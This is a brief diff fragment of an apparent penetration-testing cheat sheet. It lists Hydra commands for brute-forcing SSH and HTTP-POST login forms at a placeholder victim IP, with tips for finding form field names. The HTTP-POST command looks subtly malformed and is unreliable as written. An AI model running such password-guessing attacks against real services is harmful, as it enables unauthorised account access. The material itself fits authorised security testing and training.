@@ -212,6 +212,7 @@ hydra -l user -P passwords.txt IP_VICTIM ssh
 HTTP-POST LOGIN
 Command to attack:
 sudo hydra -l user -p passwords.txt IP_VICTIM http-post-form ‘/path/login:username_field&password_field=^PASS^:Error Message’
+
 Username Field: Firefox F12 -> Network -> Send Login.
 Password Field: Firefox F12 -> Network -> Send Login.
 
